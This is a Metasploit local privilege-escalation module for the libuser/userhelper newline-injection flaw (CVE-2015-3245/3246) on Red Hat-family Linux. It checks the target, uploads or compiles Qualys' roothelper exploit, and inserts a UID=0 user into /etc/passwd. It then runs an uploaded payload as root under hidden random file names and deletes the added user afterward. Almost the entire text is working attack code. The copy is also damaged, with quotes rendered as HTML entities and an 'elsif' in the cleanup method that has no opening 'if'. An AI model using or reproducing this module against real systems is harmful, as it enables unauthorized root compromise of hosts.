# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GreatRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Libuser roothelper Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module attempts to gain root privileges on Red Hat based Linux
        systems, including RHEL, Fedora and CentOS, by exploiting a newline
        injection vulnerability in libuser and userhelper versions prior to
        0.56.13-8 and version 0.60 before 0.60-7.

        This module makes use of the roothelper.c exploit from Qualys to
        insert a new user with UID=0 in /etc/passwd.

        Note, the password for the current user is required by userhelper.

        Note, on some systems, such as Fedora 11, the user entry for the
        current user in /etc/passwd will become corrupted and exploitation
        will fail.

        This module has been tested successfully on libuser packaged versions
        0.56.13-4.el6 on CentOS 6.0 (x86_64);
        0.56.13-5.el6 on CentOS 6.5 (x86_64);
        0.60-5.el7 on CentOS 7.1-1503 (x86_64);
        0.56.16-1.fc13 on Fedora 13 (i686);
        0.59-1.fc19 on Fedora Desktop 19 (x86_64);
        0.60-3.fc20 on Fedora Desktop 20 (x86_64);
        0.60-6.fc21 on Fedora Desktop 21 (x86_64);
        0.60-6.fc22 on Fedora Desktop 22 (x86_64);
        0.56.13-5.el6 on Red Hat 6.6 (x86_64); and
        0.60-5.el7 on Red Hat 7.0 (x86_64).

        RHEL 5 is vulnerable, however the installed version of glibc (2.5)
        is missing various functions required by roothelper.c.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Qualys&#039;,       # Discovery and C exploit
          &#039;Brendan Coles&#039; # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;Jul 24 2015&#039;,
      &#039;Platform&#039;       => [ &#039;linux&#039; ],
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
      &#039;Targets&#039;        => [[ &#039;Auto&#039;, {} ]],
      &#039;Privileged&#039;     => true,
      &#039;References&#039;     =>
        [
          [ &#039;AKA&#039;, &#039;roothelper.c&#039; ],
          [ &#039;EDB&#039;, &#039;37706&#039; ],
          [ &#039;CVE&#039;, &#039;2015-3245&#039; ],
          [ &#039;CVE&#039;, &#039;2015-3246&#039; ],
          [ &#039;BID&#039;, &#039;76021&#039; ],
          [ &#039;BID&#039;, &#039;76022&#039; ],
          [ &#039;URL&#039;, &#039;http://seclists.org/oss-sec/2015/q3/185&#039; ],
          [ &#039;URL&#039;, &#039;https://access.redhat.com/articles/1537873&#039; ]
        ],
      &#039;DefaultTarget&#039;  => 0))
    register_options [
      OptEnum.new(&#039;COMPILE&#039;, [ true, &#039;Compile on target&#039;, &#039;Auto&#039;, %w(Auto True False) ]),
      OptString.new(&#039;PASSWORD&#039;, [ true, &#039;Password for the current user&#039;, &#039;&#039; ]),
      OptString.new(&#039;WritableDir&#039;, [ true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039; ])
    ]
  end

  def base_dir
    datastore[&#039;WritableDir&#039;].to_s
  end

  def password
    datastore[&#039;PASSWORD&#039;].to_s
  end

  def upload(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def upload_and_chmodx(path, data)
    upload path, data
    cmd_exec "chmod +x &#039;#{path}&#039;"
  end

  def live_compile?
    compile = false

    if datastore[&#039;COMPILE&#039;].eql?(&#039;Auto&#039;) || datastore[&#039;COMPILE&#039;].eql?(&#039;True&#039;)
      if has_gcc?
        vprint_good &#039;gcc is installed&#039;
        compile = true
      else
        unless datastore[&#039;COMPILE&#039;].eql? &#039;Auto&#039;
          fail_with Failure::BadConfig, &#039;gcc is not installed. Compiling will fail.&#039;
        end
      end
    end

    compile
  end

  def check
    userhelper_path = &#039;/usr/sbin/userhelper&#039;
    unless setuid? userhelper_path
      vprint_error "#{userhelper_path} is not setuid"
      return CheckCode::Safe
    end
    vprint_good "#{userhelper_path} is setuid"

    unless command_exists? &#039;script&#039;
      vprint_error "script is not installed. Exploitation will fail."
      return CheckCode::Safe
    end
    vprint_good &#039;script is installed&#039;

    if cmd_exec(&#039;lsattr /etc/passwd&#039;).include? &#039;i&#039;
      vprint_error &#039;File /etc/passwd is immutable&#039;
      return CheckCode::Safe
    end
    vprint_good &#039;File /etc/passwd is not immutable&#039;

    glibc_banner = cmd_exec &#039;ldd --version&#039;
    glibc_version = Gem::Version.new glibc_banner.scan(/^ldd\s+\(.*\)\s+([\d\.]+)/).flatten.first
    if glibc_version.to_s.eql? &#039;&#039;
      vprint_error &#039;Could not determine the GNU C library version&#039;
      return CheckCode::Detected
    end

    # roothelper.c requires functions only available since glibc 2.6+
    if glibc_version < Gem::Version.new(&#039;2.6&#039;)
      vprint_error "GNU C Library version #{glibc_version} is not supported"
      return CheckCode::Safe
    end
    vprint_good "GNU C Library version #{glibc_version} is supported"

    CheckCode::Detected
  end

  def exploit
    if check == CheckCode::Safe
      fail_with Failure::NotVulnerable, &#039;Target is not vulnerable&#039;
    end

    if is_root?
      fail_with Failure::BadConfig, &#039;Session already has root privileges&#039;
    end

    unless cmd_exec("test -w &#039;#{base_dir}&#039; && echo true").include? &#039;true&#039;
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    executable_name = ".#{rand_text_alphanumeric rand(5..10)}"
    executable_path = "#{base_dir}/#{executable_name}"

    if live_compile?
      vprint_status &#039;Live compiling exploit on system...&#039;

      # Upload Qualys&#039; roothelper.c exploit:
      # - https://www.exploit-db.com/exploits/37706/
      path = ::File.join Msf::Config.data_directory, &#039;exploits&#039;, &#039;roothelper&#039;, &#039;roothelper.c&#039;
      fd = ::File.open path, &#039;rb&#039;
      c_code = fd.read fd.stat.size
      fd.close
      upload "#{executable_path}.c", c_code
      output = cmd_exec "gcc -o #{executable_path} #{executable_path}.c"

      unless output.blank?
        print_error output
        fail_with Failure::Unknown, "#{executable_path}.c failed to compile"
      end

      cmd_exec "chmod +x #{executable_path}"
      register_file_for_cleanup executable_path
    else

      # Cross-compiled with:
      # - i486-linux-musl-gcc -o roothelper -static -pie roothelper.c
      path = ::File.join Msf::Config.data_directory, &#039;exploits&#039;, &#039;roothelper&#039;, &#039;roothelper&#039;
      fd = ::File.open path, &#039;rb&#039;
      executable_data = fd.read fd.stat.size
      fd.close
      upload_and_chmodx executable_path, executable_data
    end

    # Run roothelper
    timeout = 180
    print_status "Launching roothelper exploit (Timeout: #{timeout})..."
    output = cmd_exec "echo #{password.gsub(/&#039;/, "\\\\&#039;")} | #{executable_path}", nil, timeout
    output.each_line { |line| vprint_status line.chomp }

    if output =~ %r{Creating a backup copy of "/etc/passwd" named "(.*)"}
      register_file_for_cleanup $1
    end

    if output =~ /died in parent: .*.c:517: forkstop_userhelper/
      fail_with Failure::NoAccess, &#039;Incorrect password&#039;
    end

    @username = nil

    if output =~ /Exploit successful, run "su ([a-z])" to become root/
      @username = $1
    end

    if @username.blank?
      fail_with Failure::Unknown, &#039;Something went wrong&#039;
    end

    print_good "Success! User &#039;#{@username}&#039; added to /etc/passwd"

    # Upload payload executable
    payload_path = "#{base_dir}/.#{rand_text_alphanumeric rand(5..10)}"
    upload_and_chmodx payload_path, generate_payload_exe

    # Execute payload executable
    vprint_status &#039;Executing payload...&#039;
    cmd_exec "script -c \"su - #{@username} -c #{payload_path}\" | sh & echo "
    register_file_for_cleanup &#039;typescript&#039;
  end

  #
  # Remove new user from /etc/passwd
  #
  def on_new_session(session)
    new_user_removed = false

      session.core.use &#039;stdapi&#039; unless session.ext.aliases.include? &#039;stdapi&#039;

      # Remove new user
      session.sys.process.execute &#039;/bin/sh&#039;, "-c \"sed -i &#039;s/^#{@username}:.*$//g&#039; /etc/passwd\""

      # Wait for clean up
      Rex.sleep 5

      # Check for new user in /etc/passwd
      passwd_contents = session.fs.file.open(&#039;/etc/passwd&#039;).read.to_s
      unless passwd_contents =~ /^#{@username}:/
        new_user_removed = true
      end
    elsif session.type.to_s.eql? &#039;shell&#039;
      # Remove new user
      session.shell_command_token "sed -i &#039;s/^#{@username}:.*$//g&#039; /etc/passwd"

      # Check for new user in /etc/passwd
      passwd_user = session.shell_command_token "grep &#039;#{@username}:&#039; /etc/passwd"
      unless passwd_user =~ /^#{@username}:/
        new_user_removed = true
      end
    end

    unless new_user_removed
      print_warning "Could not remove user &#039;#{@username}&#039; from /etc/passwd"
    end
  rescue => e
    print_error "Error during cleanup: #{e.message}"
  ensure
    super
  end
end

